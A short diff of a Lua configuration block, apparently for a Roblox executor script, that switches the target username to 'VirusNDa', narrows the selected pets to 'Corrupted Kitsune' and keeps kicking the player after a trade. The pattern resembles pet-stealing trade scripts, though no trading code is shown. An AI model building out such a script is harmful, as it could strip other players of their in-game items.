@@ -1,7 +1,6 @@
-getgenv().Target = "Hypertbh42"
+getgenv().Target = "VirusNDa"
 getgenv().Select_Pet = {
-    "Corrupted Kitsune",
-    "Kitsune"
+    "Corrupted Kitsune"
 }
 getgenv().Kick_After_Trade = true
 repeat task.wait() until game:IsLoaded()
